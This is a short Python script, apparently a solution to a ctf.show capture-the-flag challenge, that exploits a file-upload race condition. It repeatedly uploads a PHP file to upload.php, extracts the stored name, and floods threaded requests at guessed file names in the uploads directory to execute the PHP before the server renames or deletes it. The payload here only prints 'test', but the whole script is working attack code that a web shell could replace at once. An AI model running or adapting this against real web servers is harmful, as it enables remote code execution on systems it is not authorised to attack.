import requests
import time
import threading

subaddr = "http://86421fbb-eeff-4e54-bf5f-6f3a46c59f13.challenge.ctf.show/"

def newThread(fun, *args):
    return threading.Thread(target=fun, args=args)

def execphp(fname):
    try:
        r = requests.get(subaddr + "uploads/" + fname + ".php", timeout=5)
        x = r.text
        if len(x) > 0 and "404 Not Found" not in x and "容器已过期" not in x:
            print(f"Found: {fname}.php\n{x}")
    except requests.exceptions.RequestException as e:
        print(f"Error accessing {fname}.php: {e}")

def check(fname):
    for i in range(100, 400):
        newThread(execphp, fname + str(i)).start()
        time.sleep(3)  # 避免过多线程同时启动

def upload():
    while True:
        # 上传文件内容不能为空
        file_data = {'file': ('anything.php', "<?php echo 'test'; ?>".encode())}
        try:
            r = requests.post(subaddr + "upload.php", files=file_data, timeout=5)
            txt = r.text
            print("Uploaded:", txt)
            # 解析文件名
            if "uploads/" in txt:
                fname = txt.split("uploads/")[1].split(".php")[0]
                # 启动线程检查文件名
                newThread(check, fname).start()
        except requests.exceptions.RequestException as e:
            print(f"Upload failed: {e}")

if __name__ == '__main__':
    upload()